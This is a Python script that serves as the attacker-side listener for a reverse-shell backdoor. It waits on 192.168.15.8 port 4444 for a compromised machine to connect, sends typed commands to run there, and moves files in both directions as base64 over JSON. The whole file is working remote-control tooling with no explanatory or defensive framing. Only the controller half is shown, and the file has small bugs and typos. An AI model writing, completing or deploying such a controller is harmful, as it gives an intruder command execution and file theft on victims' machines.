#!/usr/bin/python
import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[!] waiting for connection... [!]')
        self.connection, address = listener.accept()
        print('[+] Got a connection form ' + str(address) + ' [+]')

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_files(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Download successful [+]'

    def read_files(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(' ')

            try:
                if command[0] == 'upload':
                    file_content = self.read_files(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == 'download' and '[-] error ' not in result:
                    result = self.write_files(command[1], result)

            except Exception:
                result = '[-] error during command execution [-]'

            print(result)

my_listiner = Listener('192.168.15.8', 4444)
my_listiner.run()